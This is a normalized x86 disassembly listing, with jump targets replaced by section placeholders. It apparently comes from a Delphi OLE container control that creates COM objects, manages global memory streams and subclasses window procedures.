call sub_469140
cmp [ esi + 0x218 ] 0x0
je r-xdata
mov eax esi
call sub_4684b4
mov eax esi
call sub_46855c
lea eax [ esi + 0x21c ]
call sub_405a38
cmp [ esi + 0x218 ] 0x0
je r-xdata
push 0x1
mov eax [ esi + 0x218 ]
push eax
mov eax [ eax ]
call [ eax + 0x18 ]
lea eax [ esi + 0x218 ]
call sub_405a38
mov eax [ esi + 0x210 ]
call sub_403234
lea eax [ esi + 0x240 ]
call sub_467c5c
lea eax [ esi + 0x244 ]
call sub_467c5c
mov eax [ esi + 0x208 ]
dec [ eax + 0x48 ]
mov eax [ esi + 0x208 ]
cmp [ eax + 0x48 ] 0x0
jne r-xdata
push 0x0
mov eax [ esi + 0x218 ]
push eax
mov eax [ eax ]
call [ eax + 0xc ]
mov edx ebx
and dl 0xfc
mov eax esi
call sub_4451f0
test bl bl
jle r-xdata
mov eax esi
call sub_46851c
pop esi
pop ebx
retn
mov eax esi
call sub_4035a8
sub_467d54
push ebp
mov ebp esp
push 0x0
push 0x0
push 0x0
push ebx
push esi
push edi
mov [ ebp - 0x4 ] eax
xor eax eax
push ebp
push sub_467ff4
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x220 ] 0x0
jne r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_467ffb
lea eax [ ebp - 0xc ]
call sub_405a38
lea eax [ ebp - 0x8 ]
call sub_405a38
retn
xor eax eax
push ebp
push j_sub_4036d4#7
push [ fs : eax ]
mov [ fs : eax ] esp
xor eax eax
push ebp
push j_sub_4036d4#8
push [ fs : eax ]
mov [ fs : eax ] esp
lea eax [ ebp - 0xc ]
call sub_405a38
push eax
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x218 ]
push eax
mov eax [ eax ]
call [ eax + 0x10 ]
mov ebx eax
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
jmp r-xdata
test ebx ebx
jne r-xdata
mov eax [ ebp - 0x4 ]
test eax eax
je r-xdata
cmp [ ebp - 0xc ] 0x0
jne r-xdata
push eax
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x218 ]
push eax
mov eax [ eax ]
call [ eax + 0xc ]
call sub_464030
sub eax 0xfffffd9c
mov eax [ ebp - 0x4 ]
mov ebx [ eax + 0x214 ]
test ebx ebx
jne r-xdata
lea eax [ ebp - 0x8 ]
call sub_405a38
push eax
push 0x0
push ebx
call CreateStreamOnHGlobal
call sub_464030
mov eax [ ebp - 0x8 ]
push eax
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x21c ]
push eax
mov eax [ eax ]
call [ eax + 0x14 ]
call sub_464030
mov eax [ ebp - 0x4 ]
call sub_46855c
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x21c ]
push eax
mov eax [ eax ]
call [ eax + 0x20 ]
call sub_464030
jmp r-xdata
mov edx r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x218 ]
call sub_46423c
mov eax [ ebp - 0x4 ]
add eax 0x238
push eax
mov eax [ ebp - 0x4 ]
mov ecx [ eax + 0x210 ]
test ecx ecx
je r-xdata
sub ecx 0xfffffdb4
mov eax [ ebp - 0x4 ]
add eax 0x220
call sub_405a38
push eax
push r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x218 ]
push eax
mov eax [ eax ]
call [ eax ]
call sub_464030
mov eax [ ebp - 0x4 ]
add eax 0x224
call sub_405a38
push eax
push r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x218 ]
push eax
mov eax [ eax ]
call [ eax ]
call sub_464030
mov eax [ ebp - 0x4 ]
add eax 0x228
call sub_405a38
push eax
push r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x218 ]
push eax
mov eax [ eax ]
call [ eax ]
mov eax [ ebp - 0x4 ]
add eax 0x234
push eax
mov ecx [ ebp - 0x4 ]
test ecx ecx
je r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x208 ]
lea edx [ eax + 0x10 ]
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x218 ]
call sub_46423c
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x208 ]
test [ eax + 0x2c ] 0x1
je r-xdata
sub ecx 0xfffffff8
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x208 ]
test [ eax + 0x2c ] 0x8
je r-xdata
push 0xfffffe0b
mov eax [ ebp - 0x4 ]
push eax
mov eax [ eax ]
call [ eax + 0xdc ]
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x208 ]
test [ eax + 0x2c ] 0x4
je r-xdata
push 0xfffffdfe
mov eax [ ebp - 0x4 ]
push eax
mov eax [ eax ]
call [ eax + 0xdc ]
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x208 ]
test [ eax + 0x2c ] 0x2
je r-xdata
push 0xfffffe00
mov eax [ ebp - 0x4 ]
push eax
mov eax [ eax ]
call [ eax + 0xdc ]
push 0xffffffff
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x220 ]
push eax
mov eax [ eax ]
call [ eax + 0x14 ]
mov eax [ ebp - 0x4 ]
push eax
call sub_469ad8
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
jmp r-xdata
push 0xfffffdff
mov eax [ ebp - 0x4 ]
push eax
mov eax [ eax ]
call [ eax + 0xdc ]
sub_468044
push ebp
mov ebp esp
add esp 0xfffffef8
push ebx
mov ebx edx
cmp eax 0x80040112
jne r-xdata
call sub_464030
pop ebx
mov esp ebp
pop ebp
retn
lea edx [ ebp - 0x108 ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov eax [ eax ]
call sub_403184
lea eax [ ebp - 0x108 ]
mov [ ebp - 0x8 ] eax
mov [ ebp - 0x4 ] 0x4
lea eax [ ebp - 0x8 ]
push eax
push 0x0
mov ecx ebx
mov dl 0x1
mov eax [ r-xdata ]
call sub_40ba04
call sub_4039c0
sub_46809c
push ebp
mov ebp esp
xor ecx ecx
push ecx
push ecx
push ecx
push ecx
push ecx
mov [ ebp - 0x4 ] eax
xor eax eax
push ebp
push sub_4681b6
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x4 ]
test [ eax + 0x1c ] 0x10
jne r-xdata
push ebp
lea edx [ ebp - 0x14 ]
mov eax [ rw-data ]
call sub_405efc
mov eax [ ebp - 0x14 ]
push eax
mov eax [ ebp - 0x4 ]
add eax 0x218
call sub_405a38
push eax
push r-xdata
push 0x5
push 0x0
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x208 ]
push eax
call CoCreateInstance
pop edx
call sub_468044
pop ecx
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x208 ]
cmp [ eax + 0x28 ] 0x0
je r-xdata
lea eax [ ebp - 0x8 ]
call sub_405a38
push eax
push r-xdata
push 0x0
push 0x5
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x208 ]
push eax
call CoGetClassObject
call sub_464030
lea eax [ ebp - 0xc ]
mov edx [ ebp - 0x4 ]
mov edx [ edx + 0x208 ]
mov edx [ edx + 0x28 ]
call sub_404824
push ebp
lea edx [ ebp - 0x10 ]
mov eax [ rw-data ]
call sub_405efc
mov eax [ ebp - 0x10 ]
push eax
mov eax [ ebp - 0x4 ]
add eax 0x218
call sub_405a38
push eax
mov eax [ ebp - 0xc ]
push eax
push r-xdata
push 0x0
push 0x0
mov eax [ ebp - 0x8 ]
push eax
mov eax [ eax ]
call [ eax + 0x1c ]
pop edx
call sub_468044
pop ecx
jmp r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_4681bd
lea eax [ ebp - 0x14 ]
mov edx 0x2
call sub_40402c
lea eax [ ebp - 0xc ]
call sub_404714
lea eax [ ebp - 0x8 ]
call sub_405a38
retn
sub_4681e4
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
push esi
push edi
xor edx edx
mov [ ebp - 0x8 ] edx
mov [ ebp - 0x4 ] eax
xor eax eax
push ebp
push sub_4682a6
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x4 ]
call sub_46855c
push 0x0
push 0x2
call GlobalAlloc
mov ebx eax
mov eax [ ebp - 0x4 ]
mov [ eax + 0x214 ] ebx
test ebx ebx
jne r-xdata
xor eax eax
push ebp
push sub_468279
push [ fs : eax ]
mov [ fs : eax ] esp
lea eax [ ebp - 0x8 ]
call sub_405a38
push eax
push 0x0
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x214 ]
push eax
call CreateStreamOnHGlobal
call sub_464030
push 0xffffffff
mov eax [ ebp - 0x8 ]
push eax
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x21c ]
push eax
mov eax [ eax ]
call [ eax + 0x18 ]
call sub_464030
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
jmp r-xdata
call sub_40b9bc
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_4682ad
lea eax [ ebp - 0x8 ]
call sub_405a38
retn
sub_4682b4
push ebx
add esp 0xfffffff0
mov ebx eax
mov eax ebx
call sub_467d54
test [ ebx + 0x23d ] 0x4
jne r-xdata
mov eax ebx
call sub_446358
mov edx esp
mov eax ebx
call sub_442558
push esp
mov eax ebx
call sub_4491d4
push eax
push 0x0
mov eax ebx
test eax eax
je r-xdata
push eax
push 0x0
push 0xfffffffb
mov eax [ ebx + 0x218 ]
push eax
mov eax [ eax ]
call [ eax + 0x2c ]
cmp [ ebx + 0x22c ] 0x0
jne r-xdata
sub eax 0xfffffd9c
mov eax ebx
call sub_4687c4
cmp [ ebx + 0x57 ] 0x0
jne r-xdata
mov ecx [ rw-data ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40ba84
call sub_4039c0
add esp 0x10
pop ebx
retn
mov eax ebx
call sub_4493d8
push eax
call IsWindowVisible
test eax eax
je r-xdata
push 0x0
mov eax ebx
call sub_4493d8
push eax
call ShowWindow
jmp r-xdata
sub_468358
push ebp
mov ebp esp
push ebx
push esi
push edi
mov esi edx
mov ebx eax
xor edx edx
push ebp
push j_sub_4036d4#6
push [ fs : edx ]
mov [ fs : edx ] esp
mov eax ebx
call sub_4496dc
test al al
je r-xdata
mov edx esi
mov eax ebx
call sub_446f18
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
jmp r-xdata
mov eax [ esi ]
cmp eax 0xbc00
jb r-xdata
pop edi
pop esi
pop ebx
pop ebp
retn
test [ ebx + 0x23e ] 0x1
jne r-xdata
cmp eax 0xc000
jae r-xdata
mov eax [ esi + 0x8 ]
push eax
mov eax [ esi + 0x4 ]
push eax
mov eax [ esi ]
push eax
mov eax ebx
call sub_4493d8
push eax
mov eax [ ebx + 0x174 ]
push eax
call CallWindowProcA
mov [ esi + 0xc ] eax
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
jmp r-xdata
sub [ esi ] 0x9c00
sub_4683e8
push ebx
push esi
mov esi edx
mov ebx eax
mov eax esi
mov edx [ r-xdata ]
call sub_4033c0
test al al
je r-xdata
xor eax eax
pop esi
pop ebx
retn
test [ ebx + 0x1c ] 0x10
setne al
pop esi
pop ebx
retn
sub_468410
push ebp
mov ebp esp
push ecx
push ebx
push esi
push edi
mov ebx edx
mov [ ebp - 0x4 ] eax
xor eax eax
push ebp
push j_sub_403800#6
push [ fs : eax ]
mov [ fs : eax ] esp
mov edx ebx
mov eax [ ebp - 0x4 ]
call sub_4466e0
mov eax [ ebp - 0x4 ]
push eax
push sub_468bd4
mov eax [ ebp - 0x4 ]
push eax
push sub_4694d0
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x218 ] 0x0
setne cl
mov edx r-xdata
mov eax ebx
mov ebx [ eax ]
call [ ebx + 0x8 ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
jmp r-xdata
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn
sub_4684b4
push ebx
mov ebx eax
lea ecx [ ebx + 0x238 ]
mov eax [ ebx + 0x208 ]
lea edx [ eax + 0x10 ]
mov eax [ ebx + 0x218 ]
call sub_4642e8
lea ecx [ ebx + 0x234 ]
mov edx r-xdata
mov eax [ ebx + 0x218 ]
call sub_4642e8
lea eax [ ebx + 0x228 ]
call sub_405a38
lea eax [ ebx + 0x224 ]
call sub_405a38
lea eax [ ebx + 0x220 ]
call sub_405a38
pop ebx
retn
sub_46851c
push ebx
push esi
push edi
mov ebx [ eax + 0x208 ]
mov eax [ ebx + 0x4c ]
test eax eax
je r-xdata
pop edi
pop esi
pop ebx
retn
mov esi [ eax + 0x8 ]
dec esi
test esi esi
jl r-xdata
mov eax [ ebx + 0x4c ]
call sub_403234
xor eax eax
mov [ ebx + 0x4c ] eax
inc esi
xor edi edi
mov edx edi
mov eax [ ebx + 0x4c ]
call sub_41a468
call sub_403234
inc edi
dec esi
jne r-xdata
sub_46857c
push ebx
mov ebx eax
test [ ebx + 0x23d ] 0x4
jne r-xdata
mov eax ebx
call sub_446794
pop ebx
retn
mov eax [ ebx + 0x174 ]
push eax
push 0xfffffffc
mov eax [ ebx + 0x180 ]
push eax
call SetWindowLongA
cmp [ ebx + 0x218 ] 0x0
je r-xdata
xor eax eax
mov [ ebx + 0x180 ] eax
pop ebx
retn
push 0x1
mov eax [ ebx + 0x218 ]
push eax
mov eax [ eax ]
call [ eax + 0x18 ]
sub_4685c8
push ebx
push esi
push edi
push ecx
mov ebx eax
mov ecx [ ebx + 0x208 ]
mov edi [ ecx + 0x20 ]
mov esi [ ecx + 0x24 ]
xor eax eax
jmp r-xdata
cmp eax edi
jne r-xdata
cmp edx [ esi + eax * 4 ]
je r-xdata
xor eax eax
xor edx edx
jmp r-xdata
push eax
cmp [ ecx + 0x30 ] 0x191
jb r-xdata
inc eax
pop ecx
mov [ ecx ] eax
mov [ ecx + 0x4 ] edx
pop edi
pop esi
pop ebx
retn
mov eax [ ebx ]
call sub_4031c0
call sub_4031fc
add eax 0x7
and eax 0xfffffff8
mov eax [ ecx + 0x50 ]
test eax eax
jne r-xdata
add ebx eax
pop eax
mov edx [ ebx + eax * 8 + 0x4 ]
mov eax [ ebx + eax * 8 ]
sub_46863c
push ebx
push esi
xor esi esi
call sub_4599ec
mov ebx eax
test ebx ebx
je r-xdata
mov eax esi
pop esi
pop ebx
retn
mov eax ebx
mov edx [ r-xdata ]
call sub_4033c0
test al al
je r-xdata
mov eax [ rw-data ]
mov eax [ eax ]
mov eax [ eax + 0x44 ]
test eax eax
je r-xdata
cmp [ ebx + 0x22f ] 0x1
je r-xdata
mov edx [ rw-data ]
mov esi [ eax + 0x248 ]
mov esi [ ebx + 0x248 ]
jmp r-xdata
sub_4686a0
push ebx
push esi
push edi
mov esi ecx
mov edi edx
mov ebx eax
mov eax esi
call sub_40f2ec
mov ecx esi
mov edx edi
mov eax ebx
call sub_4686c0
pop edi
pop esi
pop ebx
retn
sub_4686c0
push ebp
mov ebp esp
add esp 0xffffffe0
push ebx
push esi
push edi
mov esi ecx
mov edi edx
mov ebx eax
lea eax [ ebp - 0x20 ]
mov edx [ r-xdata ]
call sub_4049a0
xor eax eax
push ebp
push sub_468742
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax ebx
call sub_467d54
mov [ esi ] 0x0
push 0x0
lea eax [ ebp - 0x20 ]
push eax
push esi
push rw-data
push 0x2
push 0x0
mov eax [ rw-data ]
push eax
push edi
mov eax [ ebx + 0x224 ]
push eax
mov eax [ eax ]
call [ eax + 0x18 ]
test eax eax
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_468749
lea eax [ ebp - 0x20 ]
mov edx [ r-xdata ]
call sub_404a70
retn
lea edx [ ebp - 0x20 ]
call sub_464b7c
sub_468750
push ebp
mov ebp esp
push 0x0
push 0x0
push 0x0
push 0x0
push ebx
push esi
push edi
mov edi ecx
mov esi edx
mov ebx eax
xor eax eax
push ebp
push sub_46879e
push [ fs : eax ]
mov [ fs : eax ] esp
lea ecx [ ebp - 0x10 ]
mov edx esi
mov eax ebx
call sub_4687ac
lea edx [ ebp - 0x10 ]
mov eax edi
call sub_41287c
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_4687a5
lea eax [ ebp - 0x10 ]
call sub_40f300
retn
sub_4687ac
push ebx
push esi
push edi
mov edi ecx
mov esi edx
mov ebx eax
mov ecx edi
mov edx esi
mov eax ebx
call sub_4686a0
pop edi
pop esi
pop ebx
retn
sub_4687c4
push ebx
push esi
push ecx
mov ebx eax
cmp [ ebx + 0x22c ] 0x0
je r-xdata
pop edx
pop esi
pop ebx
retn
cmp [ ebx + 0x180 ] 0x0
jne r-xdata
xor eax eax
mov [ esp ] eax
push esp
mov eax [ ebx + 0x22c ]
push eax
mov eax [ eax ]
call [ eax + 0xc ]
cmp [ esp ] 0x0
jne r-xdata
mov esi [ esp ]
mov [ ebx + 0x180 ] esi
push 0xfffffffc
push esi
call GetWindowLongA
mov [ ebx + 0x174 ] eax
mov eax [ rw-data ]
mov [ eax ] ebx
push sub_43f9ac
push 0xfffffffc
mov eax [ ebx + 0x180 ]
push eax
call SetWindowLongA
push 0x0
push 0x0
push 0x0
mov eax [ ebx + 0x180 ]
push eax
call SendMessageA
mov ecx [ rw-data ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40ba84
call sub_4039c0
sub_468854
push ebx
push esi
push ebp
mov ebp esp
mov ebx eax
mov edx [ ebx + 0xc ]
test edx edx
je r-xdata
mov edx [ ebx + 0x8 ]
mov eax [ ebx + 0x4 ]
call [ ebx ]
mov esp ebp
pop ebp
pop esi
pop ebx
retn
xor eax eax
lea esi [ ebx + 0x10 ]
push [ esi + 0x8 ]
je r-xdata
mov al [ esi ]
cmp al 0x1
ja r-xdata
push [ esi + 0x4 ]
test ah ah
jne r-xdata
mov ecx [ esi + 0x4 ]
mov ah 0x1
jmp r-xdata
add esi 0xc
dec edx
jne r-xdata
sub_468894
push ebp
mov ebp esp
add esp 0xfffffd64
push ebx
push esi
push edi
mov ebx ecx
mov [ ebp - 0x4 ] eax
lea ecx [ ebp - 0x29c ]
mov eax [ ebp - 0x4 ]
call sub_4685c8
cmp [ ebp - 0x29c ] 0x10000
jl r-xdata
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
xor eax eax
mov [ ebp - 0xc ] eax
xor ecx ecx
push ebp
push j_sub_4036d4#5
push [ fs : ecx ]
mov [ fs : ecx ] esp
mov edx [ ebx + 0x8 ]
mov eax [ ebp - 0x4 ]
mov [ ebp - 0x294 ] eax
mov eax edx
mov [ ebp - 0x290 ] eax
test edx edx
je r-xdata
lea eax [ ebp - 0x29c ]
call sub_468854
mov ebx [ ebp - 0xc ]
test ebx ebx
je r-xdata
add eax eax
mov edx [ ebx ]
lea eax [ edx + eax * 8 ]
mov ebx eax
lea esi [ ebp - 0x28c ]
xor eax eax
mov [ ebp - 0x8 ] eax
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
jmp r-xdata
dec ebx
lea esi [ ebp + ebx * 8 - 0x10c ]
cmp [ esi + 0x4 ] 0x0
je r-xdata
mov edx eax
sub edx 0x4
je r-xdata
mov [ esi ] 0x0
mov edx [ ebp - 0xc ]
lea edi [ ebp + edx * 8 - 0x10c ]
xor edx edx
mov [ edi ] edx
test ah 0x40
je r-xdata
mov ebx [ ebp - 0xc ]
test ebx ebx
je r-xdata
test ebx ebx
jne r-xdata
mov eax [ esi ]
call sub_404e30
mov edx [ esi + 0x4 ]
mov [ edx ] eax
mov [ esi ] 0x1
mov eax [ ebx + 0x8 ]
mov [ esi + 0x4 ] eax
jmp r-xdata
dec edx
sub edx 0x3
jb r-xdata
mov edx edi
mov eax [ ebx + 0x8 ]
call sub_404e0c
xor eax eax
mov [ edi + 0x4 ] eax
mov eax [ edi ]
mov [ esi + 0x4 ] eax
mov edx edi
mov eax [ ebx + 0x8 ]
mov eax [ eax ]
call sub_404e0c
mov eax [ ebx + 0x8 ]
mov [ edi + 0x4 ] eax
mov [ esi + 0x4 ] edi
jmp r-xdata
dec ebx
lea eax [ ebp + ebx * 8 - 0x10c ]
call sub_404008
test ebx ebx
jne r-xdata
add esi 0xc
inc [ ebp - 0x8 ]
mov eax [ ebp - 0x8 ]
cmp eax [ ebp - 0x290 ]
jne r-xdata
mov [ esi ] 0x2
mov eax [ ebx + 0x8 ]
mov [ esi + 0x4 ] eax
mov eax [ ebx + 0xc ]
mov [ esi + 0x8 ] eax
jmp r-xdata
dec edx
je r-xdata
inc [ ebp - 0xc ]
jmp r-xdata
sub ebx 0x10
mov eax [ ebx ]
and eax 0xffff
mov edx eax
and edx 0xfff
cmp edx 0x8
jne r-xdata
mov [ esi ] 0x0
mov [ esi + 0x4 ] ebx
jmp r-xdata
jmp r-xdata
mov [ esi ] 0x0
test ah 0x20
je r-xdata
mov eax [ ebx + 0x8 ]
mov [ esi + 0x4 ] eax
mov [ esi + 0x4 ] ebx
jmp r-xdata
sub_468a34
push ebp
mov ebp esp
add esp 0xfffffff0
push ebx
push esi
push edi
mov [ ebp - 0x4 ] ecx
mov [ ebp - 0x8 ] eax
mov eax [ ebp - 0x8 ]
mov eax [ eax + 0x208 ]
cmp [ eax + 0x30 ] 0x12c
jge r-xdata
lea ecx [ ebp - 0x10 ]
mov eax [ ebp - 0x8 ]
call sub_4685c8
cmp [ ebp - 0x10 ] 0x10000
jl r-xdata
mov ecx [ ebp - 0x4 ]
mov eax [ ebp - 0x8 ]
call sub_468894
jmp r-xdata
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
xor eax eax
push ebp
push sub_468af1
push [ fs : eax ]
mov [ fs : eax ] esp
push ebx
push esi
mov esi [ ebp - 0x4 ]
mov ebx [ esi + 0x8 ]
test ebx ebx
je r-xdata
mov edx [ ebp - 0x8 ]
mov eax [ ebp - 0xc ]
call [ ebp - 0x10 ]
pop esi
pop ebx
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
jmp r-xdata
mov esi [ esi ]
mov eax ebx
shl eax 0x4
xor edx edx
add esi eax
cmp ax 0x7
ja r-xdata
je r-xdata
test dl dl
jne r-xdata
push [ esi + 0xc ]
push [ esi + 0x8 ]
test eax 0x2000
je r-xdata
mov ecx esi
inc dl
test eax 0x2000
jne r-xdata
sub esi 0x10
mov eax [ esi ]
cmp ax 0x4
ja r-xdata
push esi
jmp r-xdata
dec ebx
jne r-xdata
mov ecx [ esi + 0x8 ]
jmp r-xdata
sub_468b18
push ebx
push esi
push ecx
mov [ esp ] dl
mov esi eax
xor ebx ebx
mov eax esi
call sub_4496dc
and al [ esp ]
je r-xdata
test bl bl
jne r-xdata
push 0x0
push 0x0
push 0x30f
mov eax esi
call sub_4493d8
push eax
mov eax [ esi + 0x174 ]
push eax
call CallWindowProcA
test eax eax
setne bl
mov eax ebx
pop edx
pop esi
pop ebx
retn
mov dl [ esp ]
mov eax esi
call sub_448668
mov ebx eax
sub_468b68
push ebx
push esi
push edi
push ebp
mov ebp edx
mov esi eax
mov ebx [ esi + 0x244 ]
test ebx ebx
je r-xdata
pop ebp
pop edi
pop esi
pop ebx
retn
mov eax ebp
mov edx [ r-xdata ]
call sub_4033c0
test al al
je r-xdata
mov eax [ ebx + 0x8 ]
dec eax
test eax eax
jl r-xdata
inc eax
mov ebx eax
xor edi edi
inc edi
dec ebx
jne r-xdata
mov eax ebp
cmp [ eax + 0x18 ] 0x0
je r-xdata
mov edx edi
mov eax [ esi + 0x244 ]
call sub_41a468
cmp ebp eax
jne r-xdata
mov edx [ esi + 0x208 ]
mov edx [ edx + 0x40 ]
mov edx [ edx + edi * 4 ]
mov ecx eax
mov eax esi
call sub_468f38
jmp r-xdata
sub_468bd4
push ebp
mov ebp esp
push ecx
push ebx
push esi
push edi
mov ebx edx
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
call sub_46855c
xor eax eax
push ebp
push sub_468c76
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax ebx
mov edx [ eax ]
call [ edx ]
push eax
push 0x2
call GlobalAlloc
mov esi eax
mov eax [ ebp - 0x4 ]
mov [ eax + 0x214 ] esi
test esi esi
jne r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x214 ]
push eax
call GlobalLock
mov esi eax
xor eax eax
push ebp
push sub_468c65
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax ebx
mov edx [ eax ]
call [ edx ]
mov ecx eax
mov edx esi
mov eax ebx
mov ebx [ eax ]
call [ ebx + 0xc ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_468c6c
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x214 ]
push eax
call GlobalUnlock
retn
call sub_40b9bc
sub_468c90
push ebp
mov ebp esp
add esp 0xfffffff0
push ebx
push esi
mov [ ebp - 0x8 ] ecx
mov [ ebp - 0x4 ] edx
mov ebx eax
mov esi [ ebp + 0xc ]
mov eax [ ebx + 0x48 ]
cmp esi eax
je r-xdata
mov edx [ ebx + 0x4c ]
cmp edx [ ebp + 0x8 ]
je r-xdata
test eax eax
jg r-xdata
push esi
mov eax [ ebp + 0x8 ]
push eax
mov ecx [ ebp - 0x8 ]
mov edx [ ebp - 0x4 ]
mov eax ebx
call sub_448d8c
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x8
test edx edx
jle r-xdata
test [ ebx + 0x23d ] 0x4
jne r-xdata
mov esi [ ebx + 0x48 ]
mov eax [ ebx + 0x4c ]
mov [ ebp + 0x8 ] eax
mov eax [ rw-data ]
mov eax [ eax ]
mov eax [ eax + 0x40 ]
push eax
push 0x9ec
mov eax [ ebp + 0x8 ]
push eax
call MulDiv
push eax
mov eax [ rw-data ]
mov eax [ eax ]
mov eax [ eax + 0x40 ]
push eax
push 0x9ec
push esi
call MulDiv
lea ecx [ ebp - 0x10 ]
pop edx
call sub_41900c
lea eax [ ebp - 0x10 ]
push eax
push 0x1
mov eax [ ebx + 0x218 ]
push eax
mov eax [ eax ]
call [ eax + 0x44 ]
test eax eax
je r-xdata
sub_468d70
push ebp
mov ebp esp
push 0x0
push 0x0
push ebx
push esi
push edi
mov esi edx
mov ebx eax
xor eax eax
push ebp
push sub_468e16
push [ fs : eax ]
mov [ fs : eax ] esp
lea eax [ ebp - 0x4 ]
mov edx [ ebx + 0x8 ]
call sub_4040a0
mov edx esi
mov eax ebx
call sub_4429a0
cmp [ ebx + 0x220 ] 0x0
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_468e1d
lea eax [ ebp - 0x8 ]
mov edx 0x2
call sub_40402c
retn
push 0xfffffd42
mov eax [ ebx + 0x220 ]
push eax
mov eax [ eax ]
call [ eax + 0x14 ]
mov eax [ ebx + 0x208 ]
mov eax [ eax + 0x2c ]
test al 0x30
je r-xdata
test al 0x10
je r-xdata
mov edi 0xfffffdfb
mov edi 0xfffffdfa
jmp r-xdata
mov ecx esi
mov edx edi
mov eax ebx
call sub_4690e0
lea ecx [ ebp - 0x8 ]
mov edx edi
mov eax ebx
call sub_468750
mov edx [ ebp - 0x8 ]
mov eax [ ebp - 0x4 ]
call sub_404414
jne r-xdata
sub_468e58
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
push esi
push edi
xor ecx ecx
mov [ ebp - 0x8 ] ecx
mov ebx edx
mov [ ebp - 0x4 ] eax
xor eax eax
push ebp
push sub_468f28
push [ fs : eax ]
mov [ fs : eax ] esp
mov edx ebx
mov eax [ ebp - 0x4 ]
call sub_442a8c
test ebx ebx
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_468f2f
lea eax [ ebp - 0x8 ]
call sub_405a38
retn
xor eax eax
push ebp
push sub_468ebd
push [ fs : eax ]
mov [ fs : eax ] esp
lea eax [ ebp - 0x8 ]
call sub_405a38
push eax
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x218 ]
push eax
mov eax [ eax ]
call [ eax + 0x10 ]
mov ebx eax
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
jmp r-xdata
test ebx ebx
jne r-xdata
mov eax [ ebp - 0x4 ]
test eax eax
je r-xdata
cmp [ ebp - 0x8 ] 0x0
jne r-xdata
push eax
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x218 ]
push eax
mov eax [ eax ]
call [ eax + 0xc ]
call sub_464030
sub eax 0xfffffd9c
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x220 ] 0x0
je r-xdata
push 0xffffffff
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x220 ]
push eax
mov eax [ eax ]
call [ eax + 0x14 ]
sub_468ec2
or ebx 0xffffffff
call sub_403a3c
test ebx ebx
jne r-xdata
mov eax [ ebp - 0x4 ]
test eax eax
je r-xdata
cmp [ ebp - 0x8 ] 0x0
jne r-xdata
push eax
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x218 ]
push eax
mov eax [ eax ]
call [ eax + 0xc ]
call sub_464030
sub eax 0xfffffd9c
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x220 ] 0x0
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_468f2f
lea eax [ ebp - 0x8 ]
call sub_405a38
retn
push 0xffffffff
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x220 ]
push eax
mov eax [ eax ]
call [ eax + 0x14 ]
sub_468f38
push ebp
mov ebp esp
add esp 0xfffffff0
push ebx
push esi
push edi
